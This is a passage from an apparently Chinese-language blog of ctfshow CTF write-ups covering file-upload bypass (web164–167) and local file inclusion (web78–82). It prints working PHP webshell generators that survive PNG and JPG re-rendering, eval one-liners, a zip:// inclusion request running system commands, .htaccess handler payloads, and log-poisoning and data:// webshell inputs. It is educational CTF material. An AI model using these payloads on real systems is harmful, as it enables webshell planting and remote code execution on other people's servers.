class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">3</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;只支持PNG&quot;</span>);<br>            &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>    &#125;<br>    <br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$ret</span>);<span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$ret</span>);<br></code></pre></td></tr></table></figure><p>逃避<code>PNG</code>二次渲染的手段有两种，一个是修改<code>CRC</code>值，另一个是修改数据段，这里附上国外大佬给的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./insert_data.png&#x27;</span>);<br><span class="hljs-comment">//payload = <span class="hljs-meta">&lt;?=</span>$_GET[0]($_POST[1]);<span class="hljs-meta">?&gt;</span></span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>图片传上去后，利用抓包重放这样就可以拿到想要的数据了。</p><h3 id="web165jpg渲染绕过">web165（JPG渲染绕过）</h3><p>jpg图片二次渲染</p><p>注意：jpg图片易损，所以图片马制作失败的概率不小，纯纯看运气了</p><p>（推荐先渲染一次，然后再在渲染过的图片上搞图片马）。</p><p>附上脚本和用法，基本上都看得懂了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php ./exp.php a.jpg<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web166zip伪协议读取">web166（zip伪协议读取）</h3><p>前端打开，只要<code>zip</code>，考虑使用<code>zip</code>或者<code>phar</code>伪协议</p><p>直接把包上传，在<code>download.php</code>那里完成文件包含</p><p>需要注意的是，文件上传的时候，要修改一下文件类型</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-zip-compressed<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload/download.php?file=zip://59efade1276a2f4b6629781e65a2d409.zip%231.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>193087d3-0d5f-4ade-bc63-8959ef28b865.challenge.ctf.show<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://193087d3-0d5f-4ade-bc63-8959ef28b865.challenge.ctf.show/<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br><br><span class="ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&#x27;ls ../&#x27;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure><p>这样就成功打进去了。</p><h3 id="web167.htaccess解析">web167（.htaccess解析）</h3><p>一直打，有点累了。主要讲讲思路吧。</p><ol type="1"><li>打开前端，看看要传什么文件</li><li>传个普通jpg，返回来可以直接读取，没有直接的文件包含点</li><li>传个普通jpg图片马，竟然直接过了，说明不检查文件头和文件内容</li><li>改个PHP，phtml看看，PHP被ban了，phtml无法解析</li><li>看看.user.ini有没办法来搞一哈，发现还是不行，对应目录下没有php文件</li><li>这些都寄了，这些考虑一下解析漏洞了，打一个<code>.htaccess</code>进去，这下过了</li></ol><p>附上<code>.htaccess</code>的payload吧</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http">//法一<br>AddType application/x-httpd-php .png<br>//法二<br>&lt;FilesMatch &quot;png&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>当<code>flag</code>存在的文件不是<code>PHP</code>文件，我们也可以直接利用类似<code>.user.ini</code>的方法来做</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">php_value auto_append_file &#x27;flag&#x27;<br></code></pre></td></tr></table></figure><p>补充一个小trick，对于<code>.htaccess</code>文件，<code>\</code>是可以在多行中完成拼接的，<code>#</code>可以完成注释。</p><p>参照题目：<a href="https://www.ctfer.vip/problem/1422">羊城杯2020 easyphp</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-LFI-wp</title>
    <link href="/2022/04/10/blog0011-ctfshow-LFI-wp/"/>
    <url>/2022/04/10/blog0011-ctfshow-LFI-wp/</url>
    
    <content type="html"><![CDATA[<p>LFI应该是接触很久的漏洞了，这次来补一下ctfshow的wp。</p><span id="more"></span><h3 id="web78">web78</h3><p>PHP伪协议</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web79">web79</h3><p>继续PHP伪协议</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=<br></code></pre></td></tr></table></figure><h3 id="web80web81">web80、web81</h3><p>日志包含，在http报文中写入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(cmd);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后日志包含</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><h3 id="web82">web82</h3><p>session包含+条件竞争，主要是利用PHP在上传文件中，会在<code>/tmp/sess_&#123;sessionid&#125;</code>临时文件下，写入<code>PHP_SESSION_UPLOAD_PROGRESS</code>对应的内容，这样就实现了RCE。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> threading<br><br>url=<span 